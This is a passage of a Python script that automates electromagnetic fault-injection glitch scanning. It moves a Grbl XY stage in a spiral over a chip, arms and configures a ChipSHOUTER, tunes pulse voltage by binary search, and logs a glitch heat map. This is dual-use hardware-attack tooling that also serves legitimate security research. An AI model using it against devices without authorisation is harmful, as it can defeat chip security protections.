        if prev_hit_rate >= 0.5 and hit_rate < 0.1:
            # Sharp drop! Fine-tune between prev_voltage and new_voltage
            print(f"    Sharp drop detected ({prev_hit_rate*100:.0f}% -> {hit_rate*100:.0f}%), fine-tuning...", flush=True)

            # Binary search between prev_voltage (high) and new_voltage (low)
            high_v = prev_voltage
            low_v = new_voltage
            threshold_voltage = prev_voltage
            threshold_rate = prev_hit_rate

            # Do a few binary search iterations
            for _ in range(3):
                mid_v = (high_v + low_v) // 2
                if mid_v == high_v or mid_v == low_v:
                    break

                print(f"    Binary search {mid_v}V: ", end='', flush=True)
                set_chipshouter_voltage(mid_v)

                mid_rate, _, glitch = test_position(x, y, mid_v, shots=10)
                if glitch:
                    glitch_found = True
                print(f" = {mid_rate*100:.0f}%", flush=True)

                if mid_rate >= 0.3:
                    # Still has hits, this is our threshold
                    threshold_voltage = mid_v
                    threshold_rate = mid_rate
                    high_v = mid_v
                else:
                    # Too low, search higher
                    low_v = mid_v

            # Log and return with threshold voltage
            log_test(x, y, threshold_voltage, 0, 'threshold', hit_rate=threshold_rate, optimized_voltage=threshold_voltage)
            special = 'glitch' if glitch_found else None
            return threshold_rate, threshold_voltage, True, special, threshold_voltage

        # Normal case: found good voltage around 50%
        if hit_rate <= 0.55:
            log_test(x, y, new_voltage, 0, 'optimized', hit_rate=hit_rate, optimized_voltage=new_voltage)
            special = 'glitch' if glitch_found else None
            return hit_rate, new_voltage, True, special, new_voltage

        prev_voltage = new_voltage
        prev_hit_rate = hit_rate

        if new_voltage <= CS_VOLTAGE_MIN:
            break

    # Reached minimum voltage
    log_test(x, y, current_voltage, 0, 'optimized', hit_rate=prev_hit_rate, optimized_voltage=current_voltage)
    special = 'glitch' if glitch_found else None
    threshold_v = current_voltage if prev_hit_rate > 0 else None
    return prev_hit_rate, current_voltage, True, special, threshold_v

# Initialize Grbl - move to home position (assumes home was set manually)
print("=== Initializing Grbl ===", flush=True)
send_cmd('grbl unlock')
time.sleep(0.5)
print("Moving to home (0,0)...", flush=True)
send_cmd('grbl home')  # Move to 0,0
time.sleep(0.5)

# Initialize ChipSHOUTER
def send_cs_cmd(cmd, wait_time=0.5):
    """Send ChipSHOUTER command and wait for response"""
    s.write((cmd + '\r\n').encode())
    time.sleep(0.1)
    response = ""
    start = time.time()
    while time.time() - start < 3.0:
        if s.in_waiting:
            chunk = s.read(s.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            if "#" in chunk or "> " in chunk:
                break
        time.sleep(0.1)
    return response

def setup_chipshouter():
    """Configure ChipSHOUTER for glitching"""
    global current_voltage
    print(f"=== Configuring ChipSHOUTER ===", flush=True)
    print(f"Voltage: {CS_VOLTAGE}V, Pulse: {CS_PULSE_WIDTH}us", flush=True)

    # Reset ChipSHOUTER
    print("  Resetting...", flush=True)
    send_cs_cmd("CS RESET")
    time.sleep(1.0)

    # Set voltage
    print(f"  Setting voltage to {CS_VOLTAGE}V...", flush=True)
    send_cs_cmd(f"CS VOLTAGE {CS_VOLTAGE}")
    current_voltage = CS_VOLTAGE

    # Set pulse width
    print(f"  Setting pulse width to {CS_PULSE_WIDTH}us...", flush=True)
    send_cs_cmd(f"CS PULSE {CS_PULSE_WIDTH}")

    # Set hardware trigger
    print("  Setting trigger to HW HIGH...", flush=True)
    send_cs_cmd("CS TRIGGER HW HIGH")

    # Arm ChipSHOUTER
    print("  Arming...", flush=True)
    send_cs_cmd("CS ARM")

    # Wait for armed state
    time.sleep(1.0)
    status = send_cs_cmd("CS STATUS")
    if "armed" in status.lower() and "disarmed" not in status.lower():
        print("  ChipSHOUTER armed and ready", flush=True)
        return True
    else:
        print("  WARNING: ChipSHOUTER may not be armed", flush=True)
        return False

setup_chipshouter()

mode_str = "REVERSE" if REVERSE_SPIRAL else "FORWARD"
print(f"\n=== Starting Glitch Heat Map ({mode_str}) ===", flush=True)
print(f"Grid: {SIZE+1}x{SIZE+1} = {(SIZE+1)**2} positions", flush=True)
print(f"Shots per position: {SHOTS_PER_POSITION}", flush=True)
print(f"Starting voltage: {CS_VOLTAGE}V (min: {CS_VOLTAGE_MIN}V)", flush=True)
print(f"CSV log: {CSV_FILE}", flush=True)
print("View heat map at http://localhost:8080", flush=True)

# Generate forward spiral points first, then reverse
def generate_spiral_points(size):
    """Generate all points in forward spiral order (0,0) -> center"""
    points = []
    offset = 0
    while offset <= size // 2:
        min_c = offset
        max_c = size - offset

        if min_c > max_c:
            break

        if min_c == max_c:
            points.append((min_c, min_c))
            break

        # Start at corner
        points.append((min_c, min_c))

        # Bottom edge: left to right
        for x in range(min_c + 1, max_c + 1):
            points.append((x, min_c))

        # Right edge: bottom to top
        for y in range(min_c + 1, max_c + 1):
            points.append((max_c, y))

        # Top edge: right to left
        for x in range(max_c - 1, min_c - 1, -1):
            points.append((x, max_c))

        # Left edge: top to bottom (stop before corner)
        for y in range(max_c - 1, min_c, -1):
            points.append((min_c, y))

        offset += 1

    return points

# Generate spiral points
spiral_points = generate_spiral_points(SIZE)

# Apply bounding box if requested
if any(v is not None for v in (X_MIN, X_MAX, Y_MIN, Y_MAX)):
    xmin = X_MIN if X_MIN is not None else 0
    xmax = X_MAX if X_MAX is not None else SIZE
    ymin = Y_MIN if Y_MIN is not None else 0
    ymax = Y_MAX if Y_MAX is not None else SIZE
    spiral_points = [(x, y) for (x, y) in spiral_points
                     if xmin <= x <= xmax and ymin <= y <= ymax]
    print(f"Bounding box: x=[{xmin},{xmax}] y=[{ymin},{ymax}] -> {len(spiral_points)} points", flush=True)

if REVERSE_SPIRAL:
    spiral_points.reverse()
    direction_str = f"REVERSE: center ({spiral_points[0]}) -> (0,0)"
else:
    direction_str = f"FORWARD: (0,0) -> center ({spiral_points[-1]})"

# Override start point if specified
if START_X is not None and START_Y is not None:
    target = (START_X, START_Y)
    if target in spiral_points:
        idx = spiral_points.index(target)
        spiral_points = spiral_points[idx:] + spiral_points[:idx]
        direction_str = f"CUSTOM START: ({START_X}, {START_Y})"
    else:
        print(f"WARNING: Start position ({START_X}, {START_Y}) not in grid, using default", flush=True)

print(f"Spiral: {len(spiral_points)} points, {direction_str}", flush=True)

# Hand actual scan size + start time over to broadcast helpers for ETA reporting
total_points = len(spiral_points)
scan_start_time = time.time()

# Process each point
for i, (x, y) in enumerate(spiral_points):
    print(f"\n[{i+1}/{len(spiral_points)}] Position ({x},{y}):", end='', flush=True)

    # Reset voltage to starting level before each new position
    if current_voltage != CS_VOLTAGE:
        print(f" [reset to {CS_VOLTAGE}V]", end='', flush=True)
        set_chipshouter_voltage(CS_VOLTAGE)
        send_cmd("CS ARM")
        time.sleep(0.3)

    grbl_move(x, y)
    broadcast_move(x, y, current_voltage)
    print(f" ", end='', flush=True)
    hit_rate, _, glitch_found = test_position(x, y, current_voltage)
    print(f" {hit_rate*100:.0f}%", flush=True)

    # If glitch found, mark blue and move on immediately
    if glitch_found:
        print(f"    GLITCH FOUND! Marking as blue.", flush=True)
        broadcast_result(x, y, hit_rate, current_voltage, special='glitch')
        continue

    start_v = current_voltage
    # Optimize voltage if ANY hits were detected (not just >50%)
    if hit_rate > 0:
        hit_rate, opt_voltage, was_optimized, special, threshold_v = optimize_voltage(x, y, hit_rate, glitch_found)
        broadcast_result(x, y, hit_rate, opt_voltage, was_optimized, start_v, special=special, threshold=threshold_v)
    else:
        broadcast_result(x, y, hit_rate, current_voltage)

print("\n=== Heat Map Complete! ===", flush=True)
print(f"Total positions tested: {len(visited)}", flush=True)
print(f"CSV log saved to: {CSV_FILE}", flush=True)

# Save HTML snapshot with matching filename
HTML_FILE = CSV_FILE.replace('.csv', '.html')
save_html_snapshot(HTML_FILE)

broadcast_complete()

# Keep server running
print("Web server will stay active. Press Ctrl+C to exit.", flush=True)
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass

s.close()
